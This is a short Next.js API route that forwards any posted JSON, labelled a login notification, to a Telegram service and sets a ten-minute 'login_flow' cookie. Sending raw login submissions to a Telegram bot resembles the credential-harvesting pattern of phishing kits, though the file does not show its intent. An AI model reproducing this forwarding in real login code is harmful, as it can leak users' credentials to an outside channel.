import { NextRequest, NextResponse } from "next/server"
import { telegramService } from "@/lib/telegram"

export async function POST(request: NextRequest) {
  try {
    const data = await request.json()
    await telegramService.sendLoginNotification(data)
    const response = NextResponse.json({ success: true })
    response.cookies.set("login_flow", "1", {
      path: "/",
      maxAge: 10 * 60,
    })
    return response
  } catch (error) {
    console.error("Error sending login notification:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}


